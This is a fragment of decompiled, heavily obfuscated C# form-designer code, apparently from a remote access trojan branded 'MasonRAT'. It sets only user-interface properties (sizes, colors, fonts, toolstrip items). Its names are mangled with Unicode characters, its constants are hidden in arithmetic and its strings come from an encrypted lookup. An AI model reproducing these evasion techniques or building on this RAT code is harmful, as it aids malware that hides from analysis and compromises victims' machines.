    this.\u2694️MasonRAT\u270C\u060A\u060D\u0609ٻ\u060B\u0020\u0609ٸ\u0608\u060D\u060B.Size = new Size((21294504 + (1883977507 << 899420011) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 ^ 0)) - ((1526597013 ^ 12) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0), 19);
    this.\u2694️MasonRAT\u270C\u060A\u060D\u0609ٻ\u060B\u0020\u0609ٸ\u0608\u060D\u060B.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2740);
    this.\u2694️MasonRAT\u270Cﯧۛ̍اڜ\u0020\u060D\u060Aڠ\u060Aڣةـﻻ\u060Aﻻ\u0608ــ.Font = new Font(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2741), 12f, FontStyle.Regular, (GraphicsUnit) ((1361439634 - 25589526 % 165893716 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ ((1166504063 ^ 1788610499 << 654039674) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0 | (1144549797 ^ 592010894 % 421746907) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 ^ 0))) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0)), (byte) 0);
    this.\u2694️MasonRAT\u270Cﯧۛ̍اڜ\u0020\u060D\u060Aڠ\u060Aڣةـﻻ\u060Aﻻ\u0608ــ.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cﯧۛ̍اڜ\u0020\u060D\u060Aڠ\u060Aڣةـﻻ\u060Aﻻ\u0608ــ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2742);
    this.\u2694️MasonRAT\u270Cﯧۛ̍اڜ\u0020\u060D\u060Aڠ\u060Aڣةـﻻ\u060Aﻻ\u0608ــ.Size = new Size((-214443894 ^ ~652498270) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 ^ 0) - (1082838752 - 375282884 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1), 19);
    this.\u2694️MasonRAT\u270Cﯧۛ̍اڜ\u0020\u060D\u060Aڠ\u060Aڣةـﻻ\u060Aﻻ\u0608ــ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2743);
    this.\u2694️MasonRAT\u270Cـ\u060A\u060Dـ\u060Bـ\u060Fـ\u060Cْۛبٺ\u060Eـ.Anchor = (AnchorStyles) (((2129655207 ^ 15) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 << 1)) - (1756328335 - (172155914 << 2140136684) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 << 1 | (-924451875 ^ -1409261753) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1));
    this.\u2694️MasonRAT\u270Cـ\u060A\u060Dـ\u060Bـ\u060Fـ\u060Cْۛبٺ\u060Eـ.Animated = true;
    this.\u2694️MasonRAT\u270Cـ\u060A\u060Dـ\u060Bـ\u060Fـ\u060Cْۛبٺ\u060Eـ.BackColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cـ\u060A\u060Dـ\u060Bـ\u060Fـ\u060Cْۛبٺ\u060Eـ.ControlBoxType = ControlBoxType.MinimizeBox;
    this.\u2694️MasonRAT\u270Cـ\u060A\u060Dـ\u060Bـ\u060Fـ\u060Cْۛبٺ\u060Eـ.Cursor = Cursors.Hand;
    this.\u2694️MasonRAT\u270Cـ\u060A\u060Dـ\u060Bـ\u060Fـ\u060Cْۛبٺ\u060Eـ.CustomIconSize = 30f;
    this.\u2694️MasonRAT\u270Cـ\u060A\u060Dـ\u060Bـ\u060Fـ\u060Cْۛبٺ\u060Eـ.FillColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cـ\u060A\u060Dـ\u060Bـ\u060Fـ\u060Cْۛبٺ\u060Eـ.HoverState.FillColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cـ\u060A\u060Dـ\u060Bـ\u060Fـ\u060Cْۛبٺ\u060Eـ.HoverState.IconColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cـ\u060A\u060Dـ\u060Bـ\u060Fـ\u060Cْۛبٺ\u060Eـ.IconColor = Color.White;
    this.\u2694️MasonRAT\u270Cـ\u060A\u060Dـ\u060Bـ\u060Fـ\u060Cْۛبٺ\u060Eـ.Location = new Point(470814678 + 1787262280 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + (1038049134 - ~998841804 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1), 2);
    this.\u2694️MasonRAT\u270Cـ\u060A\u060Dـ\u060Bـ\u060Fـ\u060Cْۛبٺ\u060Eـ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2744);
    this.\u2694️MasonRAT\u270Cـ\u060A\u060Dـ\u060Bـ\u060Fـ\u060Cْۛبٺ\u060Eـ.PressedColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cـ\u060A\u060Dـ\u060Bـ\u060Fـ\u060Cْۛبٺ\u060Eـ.PressedDepth = 0;
    this.\u2694️MasonRAT\u270Cـ\u060A\u060Dـ\u060Bـ\u060Fـ\u060Cْۛبٺ\u060Eـ.Size = new Size(((1414291653 ^ 224194770 >> 1646245919) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0) - (471466440 + (1191594970 << 985637251) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1), 37);
    this.\u2694️MasonRAT\u270Cـ\u060A\u060Dـ\u060Bـ\u060Fـ\u060Cْۛبٺ\u060Eـ.TabIndex = (980007203 + -381835540 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 ^ 0) ^ -852419269 - (2066868838 << 2090613725) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 << 1) << 366446098 + (1581365945 | 1103483066) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0;
    this.\u2694️MasonRAT\u270Cـ\u060A\u060Dـ\u060Bـ\u060Fـ\u060Cْۛبٺ\u060Eـ.UseTransparentBackground = true;
    this.\u2694️MasonRAT\u270Cــــئۡـ\u0608ۧـــٽـ.Anchor = (AnchorStyles) ((21074167 - 1221641657 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 0) + (1310055566 - 109488067 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 >> 1)) % ((1373403133 ^ 1601346246 >> 1151036656) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0);
    this.\u2694️MasonRAT\u270Cــــئۡـ\u0608ۧـــٽـ.Animated = true;
    this.\u2694️MasonRAT\u270Cــــئۡـ\u0608ۧـــٽـ.BackColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cــــئۡـ\u0608ۧـــٽـ.Cursor = Cursors.Hand;
    this.\u2694️MasonRAT\u270Cــــئۡـ\u0608ۧـــٽـ.CustomIconSize = 30f;
    this.\u2694️MasonRAT\u270Cــــئۡـ\u0608ۧـــٽـ.FillColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cــــئۡـ\u0608ۧـــٽـ.HoverState.FillColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cــــئۡـ\u0608ۧـــٽـ.HoverState.IconColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cــــئۡـ\u0608ۧـــٽـ.IconColor = Color.White;
    this.\u2694️MasonRAT\u270Cــــئۡـ\u0608ۧـــٽـ.Location = new Point((1088059947 - 1198455262 % 1950223918 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) ^ -((132607294 ^ 1556349030 >> 2046760614) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ -0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0, 2);
    this.\u2694️MasonRAT\u270Cــــئۡـ\u0608ۧـــٽـ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2745);
    this.\u2694️MasonRAT\u270Cــــئۡـ\u0608ۧـــٽـ.PressedColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cــــئۡـ\u0608ۧـــٽـ.PressedDepth = 0;
    this.\u2694️MasonRAT\u270Cــــئۡـ\u0608ۧـــٽـ.Size = new Size((1333553307 ^ -116851530) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) + ((1218758051 ^ 21) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + -0 << (1536914629 - 591604092 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0, 37);
    this.\u2694️MasonRAT\u270Cــــئۡـ\u0608ۧـــٽـ.TabIndex = (-1268645570 - -1268684009 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 << 1) ^ (1646900520 > 1886844680 ? 1679340290 : 1259505218) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 ^ 0) >> ((2043428376 << 1897360278) - 1171967537 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 << 1))) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0;
    this.\u2694️MasonRAT\u270Cــــئۡـ\u0608ۧـــٽـ.UseTransparentBackground = true;
    this.\u2694️MasonRAT\u270Cٺ\u060Aـ\u060A\u060Dـڜـ\u0608ڕـ\u060B.DockIndicatorTransparencyValue = 0.6;
    this.\u2694️MasonRAT\u270Cٺ\u060Aـ\u060A\u060Dـڜـ\u0608ڕـ\u060B.TargetControl = (Control) this.\u2694️MasonRAT\u270Cءـڛٺ\u060Aٽۏڼـۨ\u060Dد\u0608ڙۏـ\u0609ﻋ̨\u0609;
    this.\u2694️MasonRAT\u270Cٺ\u060Aـ\u060A\u060Dـڜـ\u0608ڕـ\u060B.UseTransparentDrag = true;
    this.\u2694️MasonRAT\u270Cــ̍ـټﻻ\u060E؁طـۙ\u060A\u0609\u0608ڙ\u060B\u060Aـد.BackColor = Color.FromArgb((-598191973 ^ ~636202879) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - ((-682634458 ^ 725589312 << 679909798) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 + 0) << ((702613102 ^ (792336507 | 534518180)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ -0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1), (-1245925624 - 929044130 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << -0 > 732121804 + (181567424 << 1557755040) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ? (15 ^ 21) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << -0 : 53346319 % 905003367 - 53346285 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0, ((84368525 > 568132065 ? 61 : 46) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 << 1) ^ 3 + (1674133742 >> 126424158) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 ^ 0);
    this.\u2694️MasonRAT\u270Cــ̍ـټﻻ\u060E؁طـۙ\u060A\u0609\u0608ڙ\u060B\u060Aـد.Font = new Font(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2746), 12f, FontStyle.Regular, (GraphicsUnit) (((-699145620 ^ 23) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 0 ^ -(1131288106 - 432142498 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1)), (byte) 0);
    this.\u2694️MasonRAT\u270Cــ̍ـټﻻ\u060E؁طـۙ\u060A\u0609\u0608ڙ\u060B\u060Aـد.ImageScalingSize = new Size(-122670867 - 2081014674 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) - ((1749965505 ^ 1950048864 >> 6769095) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) | 986628616 + 1102413630 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0, 21);
    ToolStripItemCollection items3 = this.\u2694️MasonRAT\u270Cــ̍ـټﻻ\u060E؁طـۙ\u060A\u0609\u0608ڙ\u060B\u060Aـد.Items;
    ToolStripItem[] toolStripItems3 = new ToolStripItem[(1698603112 + 1709779024 % 1059235685 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0) + (1920132818 - (315694829 >> 1772421643) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) | (866836005 ^ 12) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 >> 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1)];
    toolStripItems3[0] = (ToolStripItem) this.\u2694️MasonRAT\u270Cـــد\u0609ڣـﻻ\u060Dڠ\u060B\u060Dـﻻا̍ـڦ\u060Eٺ;
    toolStripItems3[1] = (ToolStripItem) this.\u2694️MasonRAT\u270Cـ\u0608\u060Bּدـى\u060D\u0608ۭـڝ\u060Aـة\u0608\u0609څۧ\u0609;
    items3.AddRange(toolStripItems3);
    this.\u2694️MasonRAT\u270Cــ̍ـټﻻ\u060E؁طـۙ\u060A\u0609\u0608ڙ\u060B\u060Aـد.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2747);
    this.\u2694️MasonRAT\u270Cــ̍ـټﻻ\u060E؁طـۙ\u060A\u0609\u0608ڙ\u060B\u060Aـد.RenderStyle.ArrowColor = Color.FromArgb(-1207480859 - 1579716743 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 ^ 0) - (-1797022437 - 990175238 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0), ((-1583159236 ^ 1725029195 << 193698603) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1)) + (1494228703 + ~464915956 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 + 0 << (1355050862 + 150481341 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1))) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0, ((1700952387 << 1032744773) - 411045061 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ -(1089529081 + (1606751648 << 1040068113) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0));
